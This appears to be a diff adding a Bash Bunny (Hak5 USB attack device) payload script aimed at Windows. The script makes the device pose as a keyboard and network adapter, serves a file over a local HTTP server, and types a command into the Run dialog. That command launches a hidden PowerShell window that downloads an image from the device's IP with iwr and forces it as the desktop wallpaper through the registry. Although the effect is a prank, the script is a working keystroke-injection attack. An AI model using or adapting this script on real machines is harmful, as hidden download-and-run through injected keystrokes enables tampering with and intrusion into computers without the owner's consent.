@@ -1,0 +1,21 @@
+#!/bin/bash
+# Author: Ryan_Van_Mass
+# Credit: Hak5Darren, JBNZ
+# Target: Windows
+# Description: Change User Desktop Wallpaper
+
+#Set Up
+LED SETUP
+ATTACKMODE HID ECM_ETHERNET
+
+#Sets up a simple HTTP Server on the Bunny to copy the image to the Target
+python -m SimpleHTTPServer
+GET SWITCH_POSITION
+
+#Attack
+LED ATTACK
+QUACK QUI r
+#Copys the file to the target and makes it the Wallpaper
+QUACK STRING "powershell -w h \"\$p=\$home+'\test.jpg';iwr http://172.16.64.1:8000/root/payload/$SWITCH_POSITION/test.jpg -O \$p;SP 'HKCU:Control Panel\Desktop' WallPaper \$p;1..59|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}""
+
+LED FINISH
